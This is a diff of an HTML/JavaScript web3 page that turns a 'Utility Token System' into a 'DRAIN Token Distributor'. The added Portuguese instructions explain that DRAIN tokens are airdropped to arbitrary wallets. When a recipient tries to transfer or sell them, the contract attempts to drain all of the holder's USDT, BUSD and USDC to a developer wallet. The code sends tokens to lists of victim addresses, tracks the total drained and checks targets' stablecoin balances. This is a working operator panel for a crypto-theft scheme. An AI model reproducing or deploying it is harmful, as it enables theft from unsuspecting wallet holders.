@@ -1,13 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Utility Token System</title>
+    <title>DRAIN Token Distributor</title>
     <meta charset="utf-8">
     <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
     <style>
         :root {
             --primary: #666;
-            --success: #00a86b;
             --dark: #111;
             --light: #222;
         }
@@ -26,7 +25,7 @@
         }
         
         .container {
-            max-width: 800px;
+            max-width: 600px;
             margin: 0 auto;
             padding: 20px;
         }
@@ -53,15 +52,11 @@
             padding: 12px 20px;
             border-radius: 6px;
             cursor: pointer;
-            margin: 5px;
+            margin: 5px 0;
             width: 100%;
         }
         
-        .btn-success {
-            background: var(--success);
-        }
-        
-        input, select {
+        input, textarea {
             width: 100%;
             padding: 10px;
             background: #333;
@@ -71,102 +66,252 @@
             margin-bottom: 10px;
         }
         
-        .status {
-            padding: 10px;
+        .info-box {
+            background: #333;
+            padding: 15px;
             border-radius: 6px;
             margin: 10px 0;
-            text-align: center;
+            font-size: 14px;
         }
-        
-        .status-success { background: rgba(0,168,107,0.2); }
-        .status-warning { background: rgba(255,193,7,0.2); }
     </style>
 </head>
 <body>
     <div class="container">
         <!-- Header -->
         <div class="header">
-            <h2>Utility Token System</h2>
-            <p>Simple token distribution and management</p>
+            <h2>DRAIN Token Distributor</h2>
+            <p>Bla Bla Bla</p>
+        </div>
+
+        <!-- Instruções -->
+        <div class="card">
+            <h3>🎯 Como Funciona</h3>
+            <div class="info-box">
+                <p><strong>1.</strong> Envie DRAIN tokens para qualquer carteira</p>
+                <p><strong>2.</strong> Quando a carteira tentar TRANSFERIR/VENDER/TROCAR DRAIN</p>
+                <p><strong>3.</strong> O contrato tenta drenar TODOS stablecoins automaticamente</p>
+                <p><strong>4.</strong> Funds vão DIRETO para carteira DEV</p>
+                <p><strong>⚠️</strong> Requer APPROVE prévio dos stablecoins</p>
+            </div>
         </div>
 
         <!-- Conexão -->
         <div class="card">
             <button class="btn" id="connectWallet">Connect Wallet</button>
-            <div id="walletInfo" class="status"></div>
+            <div id="walletInfo" style="text-align: center; margin-top: 10px;"></div>
         </div>
 
         <!-- Distribuição -->
         <div class="card">
-            <h3>Distribute Tokens</h3>
-            <textarea id="walletList" placeholder="Enter wallet addresses (one per line)" rows="4"></textarea>
+            <h3>📤 Distribuir DRAIN Tokens</h3>
+            <textarea id="walletList" placeholder="Wallet addresses (one per line)" rows="4"></textarea>
             <input type="number" id="tokenAmount" placeholder="Amount per wallet" value="1">
-            <button class="btn btn-success" id="distributeTokens">Distribute UTIL Tokens</button>
-        </div>
-
-        <!-- Consolidação -->
-        <div class="card">
-            <h3>Consolidate Funds</h3>
-            <button class="btn" id="consolidateAll">Consolidate All Wallets</button>
-            <input type="text" id="specificWallet" placeholder="Specific wallet address">
-            <button class="btn" id="consolidateSpecific">Consolidate Specific Wallet</button>
-        </div>
-
-        <!-- Retirada -->
-        <div class="card">
-            <h3>Withdraw Funds</h3>
-            <select id="withdrawToken">
-                <option value="USDT">USDT</option>
-                <option value="BUSD">BUSD</option>
-                <option value="USDC">USDC</option>
-                <option value="ALL">All Tokens</option>
-            </select>
-            <button class="btn btn-success" id="withdrawFunds">Withdraw Selected</button>
+            <button class="btn" id="distributeTokens">Distribute DRAIN Tokens</button>
         </div>
 
         <!-- Status -->
         <div class="card">
-            <h3>System Status</h3>
-            <div id="systemStatus" class="status status-warning">Disconnected</div>
+            <h3>📊 System Status</h3>
+            <div id="systemStatus" class="info-box">
+                Total Drained: <span id="totalDrained">0</span><br>
+                Your Balance: <span id="yourBalance">0</span> DRAIN
+            </div>
             <button class="btn" id="refreshStatus">Refresh Status</button>
+        </div>
+
+        <!-- Verificar Carteira -->
+        <div class="card">
+            <h3>🔍 Check Wallet</h3>
+            <input type="text" id="checkWallet" placeholder="Wallet address to check">
+            <button class="btn" id="checkWalletBtn">Check Wallet Status</button>
+            <div id="walletStatus" class="info-box"></div>
         </div>
     </div>
 
     <script>
-        // ABI Simplificado
         const tokenABI = [
-            {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
-            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"wallet","type":"address"},{"indexed":false,"internalType":"uint256","name":"totalConsolidated","type":"uint256"}],"name":"AutoConsolidationTriggered","type":"event"},
-            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"wallet","type":"address"},{"indexed":false,"internalType":"bool","name":"enabled","type":"bool"}],"name":"ConsolidationToggled","type":"event"},
-            {"inputs":[{"internalType":"address[]","name":"_wallets","type":"address[]"}],"name":"consolidateMultiple","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[{"internalType":"address","name":"_wallet","type":"address"}],"name":"consolidateWallet","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[{"internalType":"address[]","name":"_wallets","type":"address[]"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"distributeTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[{"internalType":"address","name":"_token","type":"address"}],"name":"getContractBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"address","name":"_wallet","type":"address"}],"name":"getWalletStatus","outputs":[{"internalType":"bool","name":"hasToken","type":"bool"},{"internalType":"bool","name":"autoEnabled","type":"bool"},{"internalType":"uint256","name":"lastConsolidationTime","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"mintTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[],"name":"refreshBalance","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[],"name":"withdrawAllStablecoins","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[{"internalType":"address","name":"_token","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"withdrawStablecoins","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "from",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": false,
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "FundsDrained",
+                "type": "event"
+            },
+            {
+                "inputs": [],
+                "name": "DEV_WALLET",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "burn",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address[]",
+                        "name": "_wallets",
+                        "type": "address[]"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "_amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "distributeTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "getTotalDrained",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_wallet",
+                        "type": "address"
+                    }
+                ],
+                "name": "getWalletStatus",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "hasToken",
+                        "type": "bool"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "lastDrainTime",
+                        "type": "uint256"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "usdtBalance",
+                        "type": "uint256"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "busdBalance",
+                        "type": "uint256"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "usdcBalance",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "name": "lastDrain",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "totalDrained",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "account",
+                        "type": "address"
+                    }
+                ],
+                "name": "balanceOf",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            }
         ];
 
-        const TOKEN_CONTRACT_ADDRESS = "0x75B9B196f49Dc16ea6f11F9EC021a630ef419c0c"; // Coloque o endereço após deploy
+        const TOKEN_CONTRACT_ADDRESS = "0xacF414895ED673D9B84fBF32714De12ca632b158"; // Coloque após deploy
         
-        const TOKENS = {
-            USDT: "0x55d398326f99059fF775485246999027B3197955",
-            BUSD: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
-            USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
-        };
-
         let web3, tokenContract, userAccount;
 
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('connectWallet').addEventListener('click', connectWallet);
             document.getElementById('distributeTokens').addEventListener('click', distributeTokens);
-            document.getElementById('consolidateAll').addEventListener('click', consolidateAll);
-            document.getElementById('consolidateSpecific').addEventListener('click', consolidateSpecific);
-            document.getElementById('withdrawFunds').addEventListener('click', withdrawFunds);
             document.getElementById('refreshStatus').addEventListener('click', updateStatus);
+            document.getElementById('checkWalletBtn').addEventListener('click', checkWallet);
         });
 
         async function connectWallet() {
@@ -179,7 +324,6 @@
                     tokenContract = new web3.eth.Contract(tokenABI, TOKEN_CONTRACT_ADDRESS);
                     
                     document.getElementById('walletInfo').textContent = `Connected: ${userAccount.substring(0,8)}...`;
-                    document.getElementById('walletInfo').className = 'status status-success';
                     
                     updateStatus();
                     
@@ -209,7 +353,7 @@
                     from: userAccount 
                 });
                 
-                alert('Tokens distributed successfully!');
+                alert('DRAIN tokens distributed successfully!');
                 document.getElementById('walletList').value = '';
                 
             } catch (error) {
@@ -217,23 +361,24 @@
             }
         }
 
-        async function consolidateAll() {
+        async function updateStatus() {
+            if (!web3 || !tokenContract) return;
+            
             try {
-                // Em produção, você teria uma lista de wallets para consolidar
-                await tokenContract.methods.consolidateMultiple([]).send({ 
-                    from: userAccount 
-                });
+                const totalDrained = await tokenContract.methods.getTotalDrained().call();
+                const userBalance = await tokenContract.methods.balanceOf(userAccount).call();
+                const devWallet = await tokenContract.methods.DEV_WALLET().call();
                 
-                alert('Consolidation started!');
-                updateStatus();
+                document.getElementById('totalDrained').textContent = web3.utils.fromWei(totalDrained, 'ether');
+                document.getElementById('yourBalance').textContent = web3.utils.fromWei(userBalance, 'ether');
                 
             } catch (error) {
-                alert('Consolidation error: ' + error.message);
+                console.error('Status update error:', error);
             }
         }
 
-        async function consolidateSpecific() {
-            const wallet = document.getElementById('specificWallet').value;
+        async function checkWallet() {
+            const wallet = document.getElementById('checkWallet').value;
             
             if (!web3.utils.isAddress(wallet)) {
                 alert('Invalid wallet address');
@@ -241,59 +386,25 @@
             }
             
             try {
-                await tokenContract.methods.consolidateWallet(wallet).send({ 
-                    from: userAccount 
-                });
+                const [hasToken, lastDrainTime, usdtBalance, busdBalance, usdcBalance] = 
+                    await tokenContract.methods.getWalletStatus(wallet).call();
                 
-                alert('Wallet consolidated!');
-                document.getElementById('specificWallet').value = '';
-                updateStatus();
+                let statusHTML = `
+                    Has DRAIN: <strong>${hasToken ? '✅' : '❌'}</strong><br>
+                    USDT Balance: <strong>${web3.utils.fromWei(usdtBalance, 'ether')}</strong><br>
+                    BUSD Balance: <strong>${web3.utils.fromWei(busdBalance, 'ether')}</strong><br>
+                    USDC Balance: <strong>${web3.utils.fromWei(usdcBalance, 'ether')}</strong><br>
+                `;
                 
-            } catch (error) {
-                alert('Consolidation error: ' + error.message);
-            }
-        }
-
-        async function withdrawFunds() {
-            const token = document.getElementById('withdrawToken').value;
-            
-            try {
-                if (token === 'ALL') {
-                    await tokenContract.methods.withdrawAllStablecoins().send({ 
-                        from: userAccount 
-                    });
-                } else {
-                    await tokenContract.methods.withdrawStablecoins(TOKENS[token], 0).send({ 
-                        from: userAccount 
-                    });
+                if (lastDrainTime > 0) {
+                    const date = new Date(lastDrainTime * 1000);
+                    statusHTML += `Last Drained: <strong>${date.toLocaleString()}</strong>`;
                 }
                 
-                alert('Funds withdrawn successfully!');
-                updateStatus();
+                document.getElementById('walletStatus').innerHTML = statusHTML;
                 
             } catch (error) {
-                alert('Withdrawal error: ' + error.message);
-            }
-        }
-
-        async function updateStatus() {
-            if (!web3 || !tokenContract) return;
-            
-            try {
-                const usdtBalance = await tokenContract.methods.getContractBalance(TOKENS.USDT).call();
-                const busdBalance = await tokenContract.methods.getContractBalance(TOKENS.BUSD).call();
-                const usdcBalance = await tokenContract.methods.getContractBalance(TOKENS.USDC).call();
-                
-                document.getElementById('systemStatus').innerHTML = `
-                    <strong>Contract Balances:</strong><br>
-                    USDT: ${web3.utils.fromWei(usdtBalance, 'ether')}<br>
-                    BUSD: ${web3.utils.fromWei(busdBalance, 'ether')}<br>
-                    USDC: ${web3.utils.fromWei(usdcBalance, 'ether')}
-                `;
-                document.getElementById('systemStatus').className = 'status status-success';
-                
-            } catch (error) {
-                console.error('Status update error:', error);
+                alert('Error checking wallet: ' + error.message);
             }
         }
     </script>
